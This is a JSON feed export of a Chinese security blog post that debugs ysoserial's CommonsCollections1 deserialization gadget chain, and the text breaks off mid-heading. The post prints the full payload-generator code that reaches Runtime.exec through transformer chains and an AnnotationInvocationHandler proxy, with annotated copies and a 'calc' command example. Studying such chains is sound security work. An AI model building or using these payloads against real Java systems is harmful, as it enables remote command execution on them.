{
    "version": "https://jsonfeed.org/version/1",
    "title": "Milkii0的秘密花园 • All posts by \"代码审计\" category",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2021/09/07/ysoserial%E4%B9%8BCommonsCollections1%E8%B0%83%E8%AF%95/",
            "url": "http://example.com/2021/09/07/ysoserial%E4%B9%8BCommonsCollections1%E8%B0%83%E8%AF%95/",
            "title": "ysoserial之CommonsCollections1调试",
            "date_published": "2021-09-07T02:12:48.000Z",
            "content_html": "<h1 id=\"利用链简述\"><a class=\"markdownIt-Anchor\" href=\"#利用链简述\">#</a> 利用链简述</h1>\n<ol>\n<li>任意方法执行</li>\n<li>高版本 java 已修复（Java 8u71 以后）</li>\n</ol>\n<h1 id=\"commonscollections1利用代码\"><a class=\"markdownIt-Anchor\" href=\"#commonscollections1利用代码\">#</a> CommonsCollections1 利用代码</h1>\n<p>项目地址：<a href=\"https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar\">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\tGadget chain:</span></span><br><span class=\"line\"><span class=\"comment\">\t\tObjectInputStream.readObject()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\tAnnotationInvocationHandler.readObject()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\tMap(Proxy).entrySet()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\tAnnotationInvocationHandler.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\tLazyMap.get()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\tChainedTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tConstantTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tClass.getMethod()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tRuntime.getRuntime()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tRuntime.exec()</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\tRequires:</span></span><br><span class=\"line\"><span class=\"comment\">\t\tcommons-collections</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">@SuppressWarnings(&#123;&quot;rawtypes&quot;, &quot;unchecked&quot;&#125;)</span></span><br><span class=\"line\"><span class=\"meta\">@PayloadTest</span> ( precondition = <span class=\"string\">&quot;isApplicableJavaVersion&quot;</span>)</span><br><span class=\"line\"><span class=\"meta\">@Dependencies(&#123;&quot;commons-collections:commons-collections:3.1&quot;&#125;)</span></span><br><span class=\"line\"><span class=\"meta\">@Authors(&#123; Authors.FROHOFF &#125;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CommonsCollections1</span> <span class=\"keyword\">extends</span> <span class=\"title\">PayloadRunner</span> <span class=\"keyword\">implements</span> <span class=\"title\">ObjectPayload</span>&lt;<span class=\"title\">InvocationHandler</span>&gt; </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> InvocationHandler <span class=\"title\">getObject</span><span class=\"params\">(<span class=\"keyword\">final</span> String command)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> String[] execArgs = <span class=\"keyword\">new</span> String[] &#123; command &#125;;</span><br><span class=\"line\">\t\t<span class=\"comment\">// inert chain for setup</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Transformer transformerChain = <span class=\"keyword\">new</span> ChainedTransformer(</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">new</span> Transformer[]&#123; <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;);</span><br><span class=\"line\">\t\t<span class=\"comment\">// real chain for after setup</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[] &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">\t\t\t\t\tString.class, Class[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">new</span> Class[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">\t\t\t\t\tObject.class, Object[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">null</span>, <span class=\"keyword\">new</span> Object[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map innerMap = <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tReflections.setFieldValue(transformerChain, <span class=\"string\">&quot;iTransformers&quot;</span>, transformers); <span class=\"comment\">// arm with actual transformer chain</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> handler;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">final</span> String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">\t\tPayloadRunner.run(CommonsCollections1.class, args);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">boolean</span> <span class=\"title\">isApplicableJavaVersion</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> JavaVersion.isAnnInvHUniversalMethodImpl();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"调试分析\"><a class=\"markdownIt-Anchor\" href=\"#调试分析\">#</a> 调试分析</h1>\n<p>ysoserialPOC 类中 getObject 方法一般是获取 payload 的方法</p>\n<h2 id=\"分析paylaod构造\"><a class=\"markdownIt-Anchor\" href=\"#分析paylaod构造\">#</a> 分析 paylaod 构造</h2>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> InvocationHandler <span class=\"title\">getObject</span><span class=\"params\">(<span class=\"keyword\">final</span> String command)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">    \t<span class=\"comment\">// 传入的命令参数存储于execArgs数组中</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> String[] execArgs = <span class=\"keyword\">new</span> String[] &#123; command &#125;;</span><br><span class=\"line\">    \t<span class=\"comment\">// 开始构造transformerChain，用于执行命令</span></span><br><span class=\"line\">\t\t<span class=\"comment\">// inert chain for setup</span></span><br><span class=\"line\">    \t<span class=\"comment\">// 这一步据p神所言是为了隐藏日志中的进程日常信息， 加不加都会执行命令，只是异常信息不同</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Transformer transformerChain = <span class=\"keyword\">new</span> ChainedTransformer(</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">new</span> Transformer[]&#123; <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;);</span><br><span class=\"line\">\t\t<span class=\"comment\">// real chain for after setup</span></span><br><span class=\"line\">    \t<span class=\"comment\">// 通过反射获得Runtime.exec(),并将命令参数execArgs传入</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[] &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">\t\t\t\t\tString.class, Class[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">new</span> Class[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">\t\t\t\t\tObject.class, Object[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">null</span>, <span class=\"keyword\">new</span> Object[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) </span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">\t\t<span class=\"comment\">// 修饰innerMap，将构造的transformerChain传入</span></span><br><span class=\"line\">    \t<span class=\"comment\">// 当LayMap#get被调用时，会执行传入的transformerChain</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map innerMap = <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">    \t<span class=\"comment\">// 将lazyMap传入AnnotationInvocationHandler</span></span><br><span class=\"line\">    \t<span class=\"comment\">// java代理sun.reflect.annotation.AnnotationInvocationHandler</span></span><br><span class=\"line\">    \t<span class=\"comment\">// 获得代理对象时，会再传入一个handler（简称handler2），得到代理对象mapProxy，</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class=\"line\">\t\t<span class=\"comment\">// 将该代理对象包裹进入新的handler，简称handler1</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class=\"line\">\t\t<span class=\"comment\">// 最后将构造好的命令执行transformers传入transformerChain</span></span><br><span class=\"line\">    \t<span class=\"comment\">// 最后放是为了防止在构造payload时弹出计算器</span></span><br><span class=\"line\">\t\tReflections.setFieldValue(transformerChain, <span class=\"string\">&quot;iTransformers&quot;</span>, transformers); <span class=\"comment\">// arm with actual transformer chain</span></span><br><span class=\"line\">\t\t<span class=\"comment\">// 最后包装好的handler即为我们的payload</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> handler;</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"知识点\"><a class=\"markdownIt-Anchor\" href=\"#知识点\">#</a> 知识点</h3>\n<p>需要理解的知识点主要有两部分：transform 和 proxy</p>\n<p>想要深究的话可以去看详细解释，以下只记录此处用到的点</p>\n<p>我看代理的时候是参考的这篇文章：<a href=\"https://xie.infoq.cn/article/9a9387805a496e1485dc8430f\">https://xie.infoq.cn/article/9a9387805a496e1485dc8430f</a></p>\n<h4 id=\"先来看看trasnform\"><a class=\"markdownIt-Anchor\" href=\"#先来看看trasnform\">#</a> 先来看看 trasnform</h4>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">final</span> Transformer transformerChain = <span class=\"keyword\">new</span> ChainedTransformer(</span><br><span class=\"line\">    <span class=\"keyword\">new</span> Transformer[]&#123; <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;);</span><br><span class=\"line\"><span class=\"comment\">// real chain for after setup</span></span><br><span class=\"line\"><span class=\"keyword\">final</span> Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[] &#123;</span><br><span class=\"line\">    <span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">    <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">        String.class, Class[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">new</span> Class[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">    <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">        Object.class, Object[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">        <span class=\"keyword\">null</span>, <span class=\"keyword\">new</span> Object[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">    <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">        <span class=\"keyword\">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class=\"line\">    <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;;</span><br></pre></td></tr></table></figure>\n<p><strong>ConstantTransformer</strong></p>\n<p>构造方法传入一个类</p>\n<p>通过该类的 transform 方法获取一个对象类型，如 transform 参数是 Runtime.class 时，调用 ConstantTransformer 类的 transform 方法，执行后返回 java.lang.Runtime 类</p>\n<p><strong>InvokerTransformer</strong></p>\n<p>构造方法 InvokerTransformer (String methodName, Class [] paramTypes, Object [] args)</p>\n<p>第一个参数为方法名，第二个参数为方法参数类型数组，第三个参数为方法参数数组</p>\n<p>该类的 transform 通过反射执行函数</p>\n<p>例如下面的代码，transform 传入 Runtime 对象，通过反射执行 exec 函数，传入命令为 calc</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">InvokerTransformer invokerTransformer = <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class&#125;,<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;);</span><br><span class=\"line\">invokerTransformer.transform(Runtime.getRuntime());</span><br></pre></td></tr></table></figure>\n<p><strong>transformerChain</strong></p>\n<p>transformers 的链，构造方法传入一个 transform 数组</p>\n<p>串起来了很多 transformer</p>\n<p>为什么是串起来的呢，见下图</p>\n<p><img src=\"62.png\" alt=\"\"></p>\n<p>其中前面一个 transform 输出的结果会作为参数传入后一个 transform</p>\n<p>那么此处代码就可以很好的解释啦</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 通过反射获取Runtime，因为Class类实现了Serializable接口</span></span><br><span class=\"line\"><span class=\"comment\">//        Method f = Runtime.class.getMethod(&quot;getRuntime&quot;);</span></span><br><span class=\"line\"><span class=\"comment\">//        Runtime r = (Runtime) f.invoke(null);</span></span><br><span class=\"line\"><span class=\"comment\">//        r.exec(&quot;C:\\\\WINDOWS\\\\system32\\\\calc.exe&quot;</span></span><br><span class=\"line\">\t<span class=\"keyword\">final</span> Transformer transformerChain = <span class=\"keyword\">new</span> ChainedTransformer(</span><br><span class=\"line\">        <span class=\"keyword\">new</span> Transformer[]&#123; <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;);</span><br><span class=\"line\">    <span class=\"comment\">// real chain for after setup</span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[] &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 返回java.lang.Runtime类</span></span><br><span class=\"line\">        <span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),  </span><br><span class=\"line\">        <span class=\"comment\">//传入上面transform得到的Runtime类（Class对象），调用getMethod方法，传入调用getMethod方法方法参数为getRuntime；也就是获取该类的getRuntime方法</span></span><br><span class=\"line\">        <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123; </span><br><span class=\"line\">            String.class, Class[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">new</span> Class[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">        <span class=\"comment\">// 传入上面transform得到的getRuntime方法（Method对象），调用invoke方法，传入invoke方法的参数为Object[]，其实就是按照参数列表传就好了，因为此处只需要调用invoke方法获得Runtime对象</span></span><br><span class=\"line\">        <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">            Object.class, Object[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">            <span class=\"keyword\">null</span>, <span class=\"keyword\">new</span> Object[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">        <span class=\"comment\">// 传入上面transform得到的Runtime对象，调用exec方法，传入该方法的参数为execArgs</span></span><br><span class=\"line\">        <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">            <span class=\"keyword\">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class=\"line\">        <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;;</span><br></pre></td></tr></table></figure>\n<h4 id=\"最后康康proxy\"><a class=\"markdownIt-Anchor\" href=\"#最后康康proxy\">#</a> 最后康康 proxy</h4>\n<p>为什么会利用到对象代理呢？</p>\n<p>当然是因为代理的一些些特性辣</p>\n<p>每个代理类有一个公共构造一个参数，该接口的实现 <code>InvocationHandler</code>  ，设置调用处理程序的代理实例</p>\n<p>康康构造方法，会传入一个 InvocationHandler 对象</p>\n<p>并且在调用该代理对象任意方法时，会调用 InvocationHandler#invoke ()</p>\n<p><img src=\"63.png\" alt=\"\"></p>\n<p>但是该方法是 protected 的，很明显我们需要实例化一个代理对象时需要找到另一个可以返回实例的方法</p>\n<p>那就是 newProxyInstance 方法啦</p>\n<p><img src=\"64.png\" alt=\"\"></p>\n<p>来测试试试</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.util.Gadgets;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.InvocationHandler;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Proxy;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * My Test Class</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        TestInvocationHandler handler = <span class=\"keyword\">new</span> TestInvocationHandler();</span><br><span class=\"line\">        Map testProxy = (Map) Proxy.newProxyInstance(Gadgets.class.getClassLoader(), <span class=\"keyword\">new</span> Class[]&#123;Map.class&#125;, handler);</span><br><span class=\"line\">        testProxy.put(<span class=\"string\">&quot;key&quot;</span>,<span class=\"string\">&quot;value&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestInvocationHandler</span> <span class=\"keyword\">implements</span> <span class=\"title\">InvocationHandler</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">invoke</span><span class=\"params\">(Object proxy, Method method, Object[] args)</span> <span class=\"keyword\">throws</span> Throwable </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;method: &quot;</span> + method.toString());</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>debug 代码，可以看见当调用 Map#put 时，会进入 TestInvocationHandler#invoke</p>\n<p><img src=\"65.png\" alt=\"\"></p>\n<p>没戳 proxy 利用到的点就这一个啦</p>\n<h3 id=\"调试\"><a class=\"markdownIt-Anchor\" href=\"#调试\">#</a> 调试</h3>\n<p>比较绕的地方调试一波</p>\n<p><img src=\"36.png\" alt=\"\"></p>\n<p>进入该函数，发现有两处函数计算</p>\n<p><img src=\"37.png\" alt=\"\"></p>\n<p>进入 <code>createMemoizedInvocationHandler(map)</code></p>\n<p>其中 <code>ANN_INV_HANDLER_CLASS = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</code></p>\n<p>可以看出此处是通过反射获取 AnnotationInvocationHandler 对象，且获取对象时传入了构造的 LazyMap</p>\n<p><img src=\"38.png\" alt=\"\"></p>\n<p>进入 <code>createProxy(handler,iface,ifaces)</code></p>\n<p>对传入的 iface 进行代理，并传入上一步获得的 AnnotationInvocationHandler 对象 handler2</p>\n<p>iface 为传入的 Map.class (CommonsCollections1.java 中： <code>mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</code> ）</p>\n<p><img src=\"39.png\" alt=\"\"></p>\n<p>两次函数执行完毕后，返回 CommonsCollections1</p>\n<p>返回代理对象 mapProxy（调用该对象任意方法，都会先调用传入的 handler#invoke）</p>\n<p>73 行代码将获取到的 mapProxy 进行包裹是因为：</p>\n<p>​\t由于反序列化入口为 readObject，所以我们需要某个类的 readObject 中会调用传入 map 的任意方法</p>\n<p>​\tAnnotationInvocationHandler#readObject 中有调用 map.entrySet ()</p>\n<p>​\t从而触发 AnnotationInvocationHandler#invoke</p>\n<p><img src=\"40.png\" alt=\"\"></p>\n<p>最后返回层层构造好的，还没有序列化的，payload 啦</p>\n<h2 id=\"payload触发分析\"><a 